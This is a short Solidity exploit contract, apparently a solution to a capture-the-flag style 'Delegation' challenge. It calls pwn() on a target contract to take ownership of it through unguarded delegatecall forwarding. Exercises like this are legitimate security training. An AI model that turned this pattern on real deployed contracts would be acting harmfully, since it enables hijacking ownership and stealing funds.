// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    bytes4 private constant PWN_SELECTOR = bytes4(keccak256("pwn()"));
    address public delegationAddress;

    constructor(address _delegationAddress) {
        delegationAddress = _delegationAddress;
    }

    function hackContract() external {
        (bool success, ) = delegationAddress.call(
            abi.encodeWithSelector(PWN_SELECTOR)
        );
        require(success, "Failed to take ownership");
    }
}
